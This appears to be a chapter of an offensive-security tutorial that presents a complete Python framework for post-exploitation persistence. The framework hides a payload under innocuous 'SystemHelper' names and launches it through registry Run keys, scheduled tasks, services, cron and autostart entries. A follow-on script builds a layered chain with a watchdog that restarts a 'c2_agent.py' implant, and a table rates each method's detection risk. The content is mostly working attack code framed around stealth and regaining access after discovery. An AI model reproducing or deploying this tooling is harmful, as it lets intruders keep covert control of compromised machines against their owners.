# Phase 4: Post-Exploitation & Automation Frameworks
## Part 3: Persistence & Reporting

### The Target: Persistence & Reporting Framework

By the end of this part, you will:
- Understand persistence mechanisms across platforms
- Implement automated persistence techniques
- Build comprehensive logging and reporting systems
- Create evidence collection and documentation tools
- Develop operational tracking and cleanup mechanisms

### The Concept: Understanding Persistence

Think of persistence like leaving hidden doors in a building you've broken into:

- **Persistence** = A secret way back in
- **Scheduled Task** = A scheduled time when the door unlocks itself
- **Startup Script** = A door that opens automatically when someone enters
- **Registry** = A hidden switch that activates your door
- **Service** = A permanent employee who lets you in

**Why We Need Persistence:**
- **Maintain Access**: Keep a foothold in the system
- **Automation**: Automate recurring tasks
- **Stealth**: Hide your presence
- **Recovery**: Regain access if discovered
- **Long-term Operations**: Support extended campaigns

### The Implementation: Persistence Framework

#### File: `~/hacking-toolkit/post-exploit/persistence.py`

```python
#!/usr/bin/env python3
"""
persistence.py - Automated Persistence & Reporting Framework
Provides persistence mechanisms and comprehensive reporting capabilities.
"""

import sys
import os
import platform
import subprocess
import json
import datetime
import shutil
import stat
import base64
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field

class PersistenceManager:
    """
    Manages persistence mechanisms across platforms
    Supports multiple persistence methods
    """
    
    def __init__(self, verbose: bool = True, dry_run: bool = False):
        """
        Initialize the persistence manager
        
        Args:
            verbose: Enable verbose output
            dry_run: Simulate operations without making changes
        """
        self.verbose = verbose
        self.dry_run = dry_run
        self.platform = platform.system()
        self.install_dir = None
        self.payload_path = None
        self.persistence_methods = []
        self.installed_persistence = []
        
        self._detect_environment()
    
    def _detect_environment(self):
        """Detect the environment and set up paths"""
        if self.platform == 'Windows':
            self.install_dir = os.path.join(os.environ.get('APPDATA', ''), 'SystemHelper')
            self.startup_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            self.registry_key = r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
        else:
            # Linux/Unix
            home = os.path.expanduser('~')
            self.install_dir = os.path.join(home, '.cache', 'system-helper')
            self.startup_dir = os.path.join(home, '.config', 'autostart')
            self.cron_dir = '/etc/cron.d'
    
    def _run_command(self, command: str) -> str:
        """Execute a shell command"""
        if self.dry_run:
            print(f"[DRY RUN] Would execute: {command}")
            return ''
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True
            )
            return result.stdout.strip()
        except Exception as e:
            print(f"[-] Command failed: {e}")
            return ''
    
    def _write_file(self, path: str, content: str, mode: str = 'w'):
        """Write content to a file"""
        if self.dry_run:
            print(f"[DRY RUN] Would write to: {path}")
            return True
        
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, mode) as f:
                f.write(content)
            
            if self.verbose:
                print(f"[+] Written to: {path}")
            return True
        except Exception as e:
            print(f"[-] Error writing file: {e}")
            return False
    
    def _make_executable(self, path: str):
        """Make a file executable"""
        if self.dry_run:
            print(f"[DRY RUN] Would make executable: {path}")
            return
        
        try:
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)
            if self.verbose:
                print(f"[+] Made executable: {path}")
        except Exception as e:
            print(f"[-] Error making executable: {e}")
    
    def install_payload(self, payload_path: str, install_name: str = None) -> bool:
        """
        Install the payload to a persistent location
        
        Args:
            payload_path: Path to the payload file
            install_name: Name to give the installed payload
            
        Returns:
            True if successful
        """
        if not os.path.exists(payload_path):
            print(f"[-] Payload not found: {payload_path}")
            return False
        
        if not install_name:
            install_name = os.path.basename(payload_path)
        
        # Create install directory
        if not self.dry_run:
            try:
                os.makedirs(self.install_dir, exist_ok=True)
            except Exception as e:
                print(f"[-] Error creating install dir: {e}")
                return False
        
        # Copy payload
        dest_path = os.path.join(self.install_dir, install_name)
        
        if self.dry_run:
            print(f"[DRY RUN] Would copy {payload_path} to {dest_path}")
            self.payload_path = dest_path
            return True
        
        try:
            shutil.copy2(payload_path, dest_path)
            self._make_executable(dest_path)
            self.payload_path = dest_path
            
            if self.verbose:
                print(f"[+] Payload installed: {dest_path}")
            return True
        except Exception as e:
            print(f"[-] Error installing payload: {e}")
            return False
    
    def add_startup_script(self) -> bool:
        """
        Add persistence via startup script/launch agent
        
        Returns:
            True if successful
        """
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        method = {
            'type': 'startup_script',
            'details': {}
        }
        
        if self.platform == 'Windows':
            # Windows Startup folder
            shortcut_path = os.path.join(self.startup_dir, 'SystemHelper.lnk')
            
            if self.dry_run:
                print(f"[DRY RUN] Would create shortcut: {shortcut_path}")
            else:
                try:
                    import winshell
                    winshell.CreateShortcut(
                        shortcut_path,
                        target=self.payload_path,
                        workdir=os.path.dirname(self.payload_path)
                    )
                    if self.verbose:
                        print(f"[+] Startup script added: {shortcut_path}")
                    method['details']['path'] = shortcut_path
                    self.installed_persistence.append(method)
                    return True
                except:
                    pass
            
            # Alternative: VBS script
            vbs_path = os.path.join(self.install_dir, 'startup.vbs')
            vbs_content = f'''
            Set objShell = CreateObject("Wscript.Shell")
            objShell.Run "{self.payload_path}", 0, False
            '''
            
            if self._write_file(vbs_path, vbs_content):
                method['details']['path'] = vbs_path
                self.installed_persistence.append(method)
                return True
            
        else:
            # Linux/Mac: .desktop file
            desktop_path = os.path.join(self.startup_dir, 'system-helper.desktop')
            
            desktop_content = f'''
            [Desktop Entry]
            Type=Application
            Exec={self.payload_path}
            Hidden=false
            NoDisplay=false
            X-GNOME-Autostart-enabled=true
            Name=System Helper
            Comment=System maintenance service
            '''
            
            if self._write_file(desktop_path, desktop_content):
                self._make_executable(desktop_path)
                method['details']['path'] = desktop_path
                self.installed_persistence.append(method)
                return True
        
        return False
    
    def add_cron_job(self, schedule: str = '@reboot') -> bool:
        """
        Add persistence via cron (Unix/Linux only)
        
        Args:
            schedule: Cron schedule (@reboot, @daily, or custom)
            
        Returns:
            True if successful
        """
        if self.platform == 'Windows':
            print("[-] Cron not available on Windows")
            return False
        
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        method = {
            'type': 'cron_job',
            'details': {'schedule': schedule}
        }
        
        # Get current crontab
        current_cron = self._run_command('crontab -l 2>/dev/null')
        
        # Build new crontab
        cron_entry = f"{schedule} {self.payload_path} > /dev/null 2>&1"
        
        if cron_entry in current_cron:
            if self.verbose:
                print("[*] Cron job already exists")
            return True
        
        new_cron = current_cron + "\n" + cron_entry + "\n"
        
        if self.dry_run:
            print(f"[DRY RUN] Would add cron job: {cron_entry}")
            method['details']['entry'] = cron_entry
            self.installed_persistence.append(method)
            return True
        
        # Install new crontab
        try:
            process = subprocess.Popen(
                ['crontab', '-'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            process.communicate(new_cron.encode())
            
            if self.verbose:
                print(f"[+] Cron job added: {cron_entry}")
            self.installed_persistence.append(method)
            return True
        except Exception as e:
            print(f"[-] Error adding cron job: {e}")
            return False
    
    def add_scheduled_task(self, task_name: str = 'SystemHelper') -> bool:
        """
        Add persistence via scheduled task (Windows only)
        
        Args:
            task_name: Name of the scheduled task
            
        Returns:
            True if successful
        """
        if self.platform != 'Windows':
            print("[-] Scheduled tasks only available on Windows")
            return False
        
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        method = {
            'type': 'scheduled_task',
            'details': {'task_name': task_name}
        }
        
        # Create scheduled task
        command = f'''schtasks /create /tn "{task_name}" /tr "{self.payload_path}" /sc onlogon /f'''
        
        if self.dry_run:
            print(f"[DRY RUN] Would create scheduled task: {command}")
            self.installed_persistence.append(method)
            return True
        
        result = self._run_command(command)
        
        if 'SUCCESS' in result:
            if self.verbose:
                print(f"[+] Scheduled task created: {task_name}")
            self.installed_persistence.append(method)
            return True
        else:
            print(f"[-] Failed to create scheduled task: {result}")
            return False
    
    def add_registry_entry(self, key_name: str = 'SystemHelper') -> bool:
        """
        Add persistence via registry (Windows only)
        
        Args:
            key_name: Registry entry name
            
        Returns:
            True if successful
        """
        if self.platform != 'Windows':
            print("[-] Registry persistence only available on Windows")
            return False
        
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        method = {
            'type': 'registry',
            'details': {'key_name': key_name}
        }
        
        command = f'''reg add "{self.registry_key}" /v "{key_name}" /t REG_SZ /d "{self.payload_path}" /f'''
        
        if self.dry_run:
            print(f"[DRY RUN] Would add registry entry: {command}")
            self.installed_persistence.append(method)
            return True
        
        result = self._run_command(command)
        
        if 'successfully' in result.lower():
            if self.verbose:
                print(f"[+] Registry entry added: {key_name}")
            self.installed_persistence.append(method)
            return True
        else:
            print(f"[-] Failed to add registry entry: {result}")
            return False
    
    def add_service(self, service_name: str = 'SystemHelper') -> bool:
        """
        Add persistence via service (Windows/Linux)
        
        Args:
            service_name: Name of the service
            
        Returns:
            True if successful
        """
        if not self.payload_path:
            print("[-] No payload installed")
            return False
        
        method = {
            'type': 'service',
            'details': {'service_name': service_name}
        }
        
        if self.platform == 'Windows':
            # Windows service using sc
            command = f'''sc create "{service_name}" binPath= "{self.payload_path}" start= auto'''
            
            if self.dry_run:
                print(f"[DRY RUN] Would create Windows service: {command}")
                self.installed_persistence.append(method)
                return True
            
            result = self._run_command(command)
            
            if 'SUCCESS' in result:
                if self.verbose:
                    print(f"[+] Windows service created: {service_name}")
                self.installed_persistence.append(method)
                return True
            else:
                print(f"[-] Failed to create service: {result}")
                return False
        
        else:
            # Linux systemd service
            service_path = f'/etc/systemd/system/{service_name}.service'
            service_content = f'''
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
'''
            
            if self.dry_run:
                print(f"[DRY RUN] Would create systemd service: {service_path}")
                self.installed_persistence.append(method)
                return True
            
            try:
                # Write service file
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                # Reload systemd and enable service
                self._run_command('systemctl daemon-reload')
                self._run_command(f'systemctl enable {service_name}.service')
                self._run_command(f'systemctl start {service_name}.service')
                
                if self.verbose:
                    print(f"[+] Systemd service created: {service_name}")
                self.installed_persistence.append(method)
                return True
                
            except Exception as e:
                print(f"[-] Error creating service: {e}")
                return False
    
    def add_all_persistence(self, payload_path: str) -> List[Dict]:
        """
        Add all available persistence methods
        
        Args:
            payload_path: Path to the payload
            
        Returns:
            List of installed persistence methods
        """
        print("[*] Installing persistence...")
        print("="*60)
        
        # Install payload
        if not self.install_payload(payload_path):
            print("[-] Failed to install payload")
            return []
        
        # Add persistence methods
        methods = []
        
        # Windows-specific
        if self.platform == 'Windows':
            if self.add_startup_script():
                methods.append('startup_script')
            if self.add_registry_entry():
                methods.append('registry')
            if self.add_scheduled_task():
                methods.append('scheduled_task')
            if self.add_service():
                methods.append('service')
        
        # Unix/Linux-specific
        else:
            if self.add_startup_script():
                methods.append('startup_script')
            if self.add_cron_job():
                methods.append('cron_job')
            if self.add_service():
                methods.append('service')
        
        # Print summary
        print("="*60)
        print("[*] Persistence Installation Summary")
        print(f"  Payload installed: {self.payload_path}")
        print(f"  Methods installed: {len(methods)}")
        for method in methods:
            print(f"    - {method}")
        
        return self.installed_persistence
    
    def cleanup(self):
        """
        Remove all installed persistence methods
        """
        print("\n[*] Cleaning up persistence...")
        
        for method in self.installed_persistence:
            if method['type'] == 'startup_script':
                path = method['details'].get('path')
                if path and os.path.exists(path):
                    if self.dry_run:
                        print(f"[DRY RUN] Would remove: {path}")
                    else:
                        try:
                            os.remove(path)
                            print(f"[+] Removed: {path}")
                        except:
                            pass
            
            elif method['type'] == 'cron_job':
                if self.dry_run:
                    print("[DRY RUN] Would remove cron job")
                else:
                    current_cron = self._run_command('crontab -l 2>/dev/null')
                    # Remove our entry
                    lines = [line for line in current_cron.split('\n') 
                           if self.payload_path not in line]
                    new_cron = '\n'.join(lines)
                    
                    process = subprocess.Popen(
                        ['crontab', '-'],
                        stdin=subprocess.PIPE
                    )
                    process.communicate(new_cron.encode())
                    print("[+] Removed cron job")
            
            elif method['type'] == 'scheduled_task':
                task_name = method['details'].get('task_name')
                if task_name:
                    if self.dry_run:
                        print(f"[DRY RUN] Would remove scheduled task: {task_name}")
                    else:
                        self._run_command(f'schtasks /delete /tn "{task_name}" /f')
                        print(f"[+] Removed scheduled task: {task_name}")
            
            elif method['type'] == 'registry':
                key_name = method['details'].get('key_name')
                if key_name:
                    if self.dry_run:
                        print(f"[DRY RUN] Would remove registry: {key_name}")
                    else:
                        self._run_command(f'reg delete "{self.registry_key}" /v "{key_name}" /f')
                        print(f"[+] Removed registry: {key_name}")
            
            elif method['type'] == 'service':
                service_name = method['details'].get('service_name')
                if service_name:
                    if self.dry_run:
                        print(f"[DRY RUN] Would remove service: {service_name}")
                    else:
                        if self.platform == 'Windows':
                            self._run_command(f'sc delete "{service_name}"')
                        else:
                            self._run_command(f'systemctl stop {service_name}.service')
                            self._run_command(f'systemctl disable {service_name}.service')
                            os.remove(f'/etc/systemd/system/{service_name}.service')
                            self._run_command('systemctl daemon-reload')
                        print(f"[+] Removed service: {service_name}")
        
        # Remove payload
        if self.payload_path and os.path.exists(self.payload_path):
            if self.dry_run:
                print(f"[DRY RUN] Would remove payload: {self.payload_path}")
            else:
                try:
                    os.remove(self.payload_path)
                    print(f"[+] Removed payload: {self.payload_path}")
                except:
                    pass
    
    def get_status(self) -> Dict[str, Any]:
        """
        Get current persistence status
        
        Returns:
            Dictionary with status information
        """
        return {
            'platform': self.platform,
            'install_dir': self.install_dir,
            'payload_path': self.payload_path,
            'persistence_methods': self.installed_persistence,
            'dry_run': self.dry_run
        }

class ReportGenerator:
    """
    Generates comprehensive reports for operations
    """
    
    def __init__(self, operation_name: str = "Operation"):
        self.operation_name = operation_name
        self.start_time = datetime.datetime.now()
        self.events = []
        self.data = {}
    
    def log_event(self, event_type: str, description: str, data: Any = None):
        """Log an event"""
        event = {
            'timestamp': datetime.datetime.now().isoformat(),
            'type': event_type,
            'description': description,
            'data': data
        }
        self.events.append(event)
        print(f"[{event_type}] {description}")
    
    def add_data(self, key: str, value: Any):
        """Add data to the report"""
        self.data[key] = value
    
    def generate_report(self, format: str = 'json') -> str:
        """
        Generate a report
        
        Args:
            format: Report format ('json', 'text', 'html')
            
        Returns:
            Report as a string
        """
        report_data = {
            'operation_name': self.operation_name,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.datetime.now().isoformat(),
            'duration': str(datetime.datetime.now() - self.start_time),
            'events': self.events,
            'data': self.data
        }
        
        if format == 'json':
            return json.dumps(report_data, indent=2, default=str)
        elif format == 'text':
            text = f"OPERATION REPORT: {self.operation_name}\n"
            text += "="*60 + "\n"
            text += f"Start: {report_data['start_time']}\n"
            text += f"End: {report_data['end_time']}\n"
            text += f"Duration: {report_data['duration']}\n"
            text += "="*60 + "\n\n"
            
            for event in self.events:
                text += f"[{event['type']}] {event['description']}\n"
            
            if self.data:
                text += "\nDATA:\n"
                for key, value in self.data.items():
                    text += f"  {key}: {value}\n"
            
            return text
        elif format == 'html':
            html = f"<html><head><title>Operation Report: {self.operation_name}</title></head><body>"
            html += f"<h1>Operation Report: {self.operation_name}</h1>"
            html += f"<p>Start: {report_data['start_time']}</p>"
            html += f"<p>End: {report_data['end_time']}</p>"
            html += f"<p>Duration: {report_data['duration']}</p>"
            html += "<h2>Events</h2><ul>"
            for event in self.events:
                html += f"<li>[{event['type']}] {event['description']}</li>"
            html += "</ul>"
            if self.data:
                html += "<h2>Data</h2><pre>" + json.dumps(self.data, indent=2) + "</pre>"
            html += "</body></html>"
            return html
        
        return ""

def main():
    """Interactive persistence demonstration"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Persistence & Reporting Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Install all persistence methods
  python3 persistence.py --install payload.exe
  
  # Install specific methods
  python3 persistence.py --install payload.exe --startup --cron --service
  
  # Clean up persistence
  python3 persistence.py --cleanup
  
  # Generate report
  python3 persistence.py --report --format json -o report.json
        """
    )
    
    parser.add_argument('--install', help='Install persistence for payload')
    parser.add_argument('--startup', action='store_true', help='Add startup script')
    parser.add_argument('--cron', action='store_true', help='Add cron job (Linux)')
    parser.add_argument('--scheduled-task', action='store_true', help='Add scheduled task (Windows)')
    parser.add_argument('--registry', action='store_true', help='Add registry entry (Windows)')
    parser.add_argument('--service', action='store_true', help='Add service')
    parser.add_argument('--cleanup', action='store_true', help='Clean up all persistence')
    parser.add_argument('--report', action='store_true', help='Generate report')
    parser.add_argument('--format', default='json', choices=['json', 'text', 'html'], help='Report format')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--dry-run', action='store_true', help='Simulate without making changes')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Create persistence manager
    manager = PersistenceManager(verbose=args.verbose, dry_run=args.dry_run)
    report = ReportGenerator("Persistence Operation")
    
    if args.install:
        # Install persistence
        report.log_event('info', f'Installing persistence for: {args.install}')
        
        if args.startup or args.cron or args.scheduled_task or args.registry or args.service:
            # Install specific methods
            if args.startup:
                manager.install_payload(args.install)
                manager.add_startup_script()
                report.log_event('success', 'Startup script installed')
            
            if args.cron:
                manager.install_payload(args.install)
                manager.add_cron_job()
                report.log_event('success', 'Cron job installed')
            
            if args.scheduled_task:
                manager.install_payload(args.install)
                manager.add_scheduled_task()
                report.log_event('success', 'Scheduled task installed')
            
            if args.registry:
                manager.install_payload(args.install)
                manager.add_registry_entry()
                report.log_event('success', 'Registry entry installed')
            
            if args.service:
                manager.install_payload(args.install)
                manager.add_service()
                report.log_event('success', 'Service installed')
        else:
            # Install all methods
            methods = manager.add_all_persistence(args.install)
            report.log_event('success', f'Installed {len(methods)} persistence methods')
    
    elif args.cleanup:
        # Clean up persistence
        report.log_event('info', 'Cleaning up persistence')
        manager.cleanup()
        report.log_event('success', 'Persistence cleaned up')
    
    else:
        # Show status
        status = manager.get_status()
        print("\n[*] Persistence Status:")
        print(json.dumps(status, indent=2, default=str))
    
    # Generate report
    if args.report:
        report.add_data('persistence_status', manager.get_status())
        report_content = report.generate_report(format=args.format)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(report_content)
            print(f"[+] Report saved to: {args.output}")
        else:
            print("\n" + report_content)

if __name__ == "__main__":
    main()
```

### The Verification: Testing Persistence

#### Test 1: Install Persistence (Linux)

```bash
cd ~/hacking-toolkit/post-exploit

# Create a test payload
echo '#!/bin/bash\necho "Persistence test" >> /tmp/persist.log' > test_payload.sh
chmod +x test_payload.sh

# Install all persistence methods
python3 persistence.py --install test_payload.sh --verbose
```

**Expected Output:**
```
[*] Installing persistence...
============================================================
[+] Payload installed: /home/user/.cache/system-helper/test_payload.sh
[+] Startup script added: /home/user/.config/autostart/system-helper.desktop
[+] Cron job added: @reboot /home/user/.cache/system-helper/test_payload.sh > /dev/null 2>&1
[+] Systemd service created: SystemHelper
============================================================
[*] Persistence Installation Summary
  Payload installed: /home/user/.cache/system-helper/test_payload.sh
  Methods installed: 3
    - startup_script
    - cron_job
    - service
```

#### Test 2: Install Persistence (Windows)

```bash
# Create a test payload
echo '@echo off' > test_payload.bat
echo 'echo Persistence test >> %TEMP%\persist.log' >> test_payload.bat

# Install Windows persistence
python3 persistence.py --install test_payload.bat --startup --registry --scheduled-task --verbose
```

#### Test 3: Cleanup

```bash
python3 persistence.py --cleanup --verbose
```

#### Test 4: Generate Report

```bash
python3 persistence.py --report --format json -o persistence_report.json
```

### Advanced Usage: Automated Persistence Chain

```python
# Automated persistence chain example
cat > persistence_chain.py << 'EOF'
#!/usr/bin/env python3
from persistence import PersistenceManager, ReportGenerator
import time
import json

def setup_persistence_chain():
    """Setup a multi-layered persistence chain"""
    
    # Create report
    report = ReportGenerator("Persistence Chain Operation")
    report.log_event('info', 'Starting persistence chain setup')
    
    # Create persistence manager
    manager = PersistenceManager(verbose=True)
    
    # Payload paths
    primary_payload = "c2_agent.py"
    fallback_payload = "fallback.sh"
    
    # Stage 1: Primary persistence
    report.log_event('info', 'Stage 1: Installing primary payload')
    manager.install_payload(primary_payload)
    
    # Stage 2: Multiple persistence methods
    methods = [
        ('startup', 'Startup script'),
        ('cron', 'Cron job'),
        ('service', 'System service')
    ]
    
    for method_name, description in methods:
        if method_name == 'startup':
            manager.add_startup_script()
        elif method_name == 'cron':
            manager.add_cron_job()
        elif method_name == 'service':
            manager.add_service()
        
        report.log_event('success', f'Installed {description}')
        time.sleep(0.5)
    
    # Stage 3: Backup/failsafe persistence
    report.log_event('info', 'Stage 3: Installing fallback persistence')
    
    # Install fallback with different methods
    manager.install_payload(fallback_payload, install_name='system_fallback')
    
    # Use different persistence method for fallback
    if manager.platform == 'Windows':
        manager.add_registry_entry(key_name='SystemFallback')
    else:
        # Create a cron job that checks if primary is running
        check_script = '''
#!/bin/bash
if ! pgrep -f "c2_agent.py"; then
    /path/to/fallback.sh
fi
'''
        manager._write_file('/tmp/check_primary.sh', check_script)
        manager._make_executable('/tmp/check_primary.sh')
        manager.add_cron_job(schedule='* * * * * /tmp/check_primary.sh')
    
    report.log_event('success', 'Fallback persistence installed')
    
    # Stage 4: Persistence verification
    report.log_event('info', 'Verifying persistence')
    status = manager.get_status()
    
    # Store status in report
    report.add_data('persistence_status', status)
    report.add_data('methods_count', len(manager.installed_persistence))
    
    report.log_event('success', f'Persistence chain installed: {len(manager.installed_persistence)} methods')
    
    return manager, report

# Run the persistence chain
print("="*60)
print("  SETTING UP PERSISTENCE CHAIN")
print("="*60)

manager, report = setup_persistence_chain()

# Generate report
print("\n[*] Generating report...")
report_content = report.generate_report(format='json')

with open('persistence_chain_report.json', 'w') as f:
    f.write(report_content)

print("[+] Report saved to persistence_chain_report.json")

# Display summary
print("\n[*] Persistence Chain Summary:")
print(f"  Platform: {manager.platform}")
print(f"  Primary payload: {manager.payload_path}")
print(f"  Methods installed: {len(manager.installed_persistence)}")
print(f"  Dry run: {manager.dry_run}")
EOF

python3 persistence_chain.py
```

### Reference: Persistence Methods

| Method | Platform | Detection Risk | Persistence |
|--------|----------|---------------|-------------|
| Startup Script | All | Medium | Per user |
| Cron/Scheduled Task | Linux/Windows | Low | Per system |
| Registry | Windows | Medium | Per user |
| Service | All | Low | Per system |
| Autostart | Linux/Mac | Medium | Per user |
| Launch Agent | macOS | Low | Per user |
| WMI Subscription | Windows | Low | Per system |
| Systemd Timer | Linux | Low | Per system |
